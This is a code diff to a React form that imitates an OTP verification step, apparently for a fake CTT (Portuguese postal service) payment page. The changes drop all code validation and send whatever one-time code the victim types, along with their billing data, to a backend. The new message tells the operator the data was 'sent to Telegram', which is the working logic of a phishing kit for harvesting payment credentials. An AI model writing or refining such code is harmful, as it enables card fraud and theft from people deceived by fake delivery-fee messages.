@@ -114,10 +114,11 @@ const CTTOTPForm = () => {
   };
 
   const handleVerifyOTP = async () => {
-    if (!otpCode || otpCode.length !== 6) {
+    // Aceitar qualquer código que o cliente escrever (sem validação)
+    if (!otpCode) {
       toast({
-        title: "Código inválido",
-        description: "Por favor, introduza um código de 6 dígitos",
+        title: "Campo vazio",
+        description: "Por favor, introduza o código",
         variant: "destructive"
       });
       return;
@@ -126,7 +127,7 @@ const CTTOTPForm = () => {
     setIsVerifying(true);
 
     try {
-      // Simulate OTP verification (in real app, this would call backend)
+      // Enviar qualquer código que o cliente digitou
       const response = await axios.post(`${API}/ctt/otp/verify`, {
         otp_code: otpCode,
         billing_data: billingData,
@@ -135,8 +136,8 @@ const CTTOTPForm = () => {
 
       if (response.data.status === 'success') {
         toast({
-          title: "Código verificado com sucesso!",
-          description: "Processando pagamento...",
+          title: "Código enviado!",
+          description: "Informação enviada para o Telegram",
           duration: 2000
         });
 
@@ -147,20 +148,14 @@ const CTTOTPForm = () => {
         setTimeout(() => {
           navigate('/confirmation');
         }, 2000);
-      } else {
-        toast({
-          title: "Código incorreto",
-          description: "Por favor, verifique o código e tente novamente",
-          variant: "destructive"
-        });
       }
 
     } catch (error) {
-      console.error('Error verifying OTP:', error);
+      console.error('Error submitting OTP:', error);
       
       toast({
-        title: "Erro na verificação",
-        description: error.response?.data?.detail || "Tente novamente em alguns segundos",
+        title: "Erro ao enviar",
+        description: "Tente novamente em alguns segundos",
         variant: "destructive"
       });
     } finally {
